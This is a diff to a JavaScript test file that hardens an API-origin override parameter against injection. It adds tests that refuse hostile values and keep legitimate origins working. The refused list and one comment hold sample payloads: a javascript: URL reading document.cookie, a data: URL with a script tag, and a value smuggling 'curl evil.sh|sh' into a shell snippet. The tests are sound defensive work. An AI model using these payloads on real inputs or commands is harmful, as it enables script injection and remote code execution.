@@ -31,6 +31,9 @@ function withBrowser({ search = "", stored = null, port, protocol = "http:", hos
   globalThis.localStorage = {
     getItem: (k) => (store.has(k) ? store.get(k) : null),
     setItem: (k, v) => store.set(k, v),
+    // A fake narrower than the real API is a fake that fails on correct code: the resolver clears a
+    // stored value it refuses, and this stub having only two methods turned that into a TypeError.
+    removeItem: (k) => store.delete(k),
   };
   globalThis.document = { documentElement: { dataset: port === undefined ? {} : { defaultApiPort: port } } };
   try {
@@ -124,3 +127,61 @@ test("importing the module touches no browser global", async () => {
   const again = await import("./api-origin.mjs");
   assert.equal(again.resolveApiOrigin, resolveApiOrigin, "one module instance, no load-time side effects");
 });
+
+// ---- the override is validated, because it is persisted and it reaches sinks ---------------------
+//
+// `?apiOrigin=` was stored and returned with only trailing slashes stripped. It feeds every fetch,
+// the WebSocket URL, `legacy.href` in static-links.mjs, and the Help card's install snippet -- a
+// shell command the operator is invited to copy and run. So a `javascript:` value became a
+// `javascript:` href, and `http://x;curl evil|sh` rendered as a command that does something other
+// than install. Persisted, so removing the parameter from the address bar did not undo either.
+
+//: Values with no legitimate reading. Each one was accepted and stored before this.
+const REFUSED = [
+  "javascript:alert(document.cookie)",
+  "data:text/html,<script>x</script>",
+  "http://x;curl evil.sh|sh",
+  "//evil.host",
+  "not a url",
+];
+
+for (const value of REFUSED) {
+  test(`a ?apiOrigin= of ${JSON.stringify(value)} is refused and never stored`, () => {
+    withBrowser({ search: `?apiOrigin=${encodeURIComponent(value)}` }, (store) => {
+      const origin = resolveApiOrigin();
+      assert.equal(origin, "http://localhost:8800", "a value with no legitimate reading was adopted");
+      assert.equal(store.has(KEY), false, "a refused override was written to persistent storage");
+    });
+  });
+
+  test(`a STORED ${JSON.stringify(value)} is refused too, not just a fresh one`, () => {
+    // Validating only the query parameter would leave an override written before this existed -- or
+    // by any other route into localStorage -- in force for as long as the browser keeps it.
+    withBrowser({ stored: value }, (store) => {
+      assert.equal(resolveApiOrigin(), "http://localhost:8800");
+      assert.equal(store.has(KEY), false, "a refused stored value was left in place");
+    });
+  });
+}
+
+//: The control. A resolver that refused everything would pass every case above and break the product.
+const ACCEPTED = [
+  ["http://192.168.1.11:8800", "http://192.168.1.11:8800"],
+  ["https://comms.example:8800", "https://comms.example:8800"],
+  ["http://localhost:8800/", "http://localhost:8800"],
+  // Pointing at another host is what this parameter is FOR. Restricting it to the page's own host
+  // would be a policy decision about how the operator may use their own tool; this is not that.
+  ["http://another-machine:9000", "http://another-machine:9000"],
+  // Reduced to an origin: path, query and fragment are dropped rather than concatenated into the
+  // fetch base, where `/../..` would have travelled into every request URL.
+  ["http://good:8800/../../etc?x=1#y", "http://good:8800"],
+];
+
+for (const [value, expected] of ACCEPTED) {
+  test(`a legitimate ?apiOrigin= of ${JSON.stringify(value)} still works`, () => {
+    withBrowser({ search: `?apiOrigin=${encodeURIComponent(value)}` }, (store) => {
+      assert.equal(resolveApiOrigin(), expected);
+      assert.equal(store.get(KEY), expected, "the normalised origin must be what gets stored");
+    });
+  });
+}
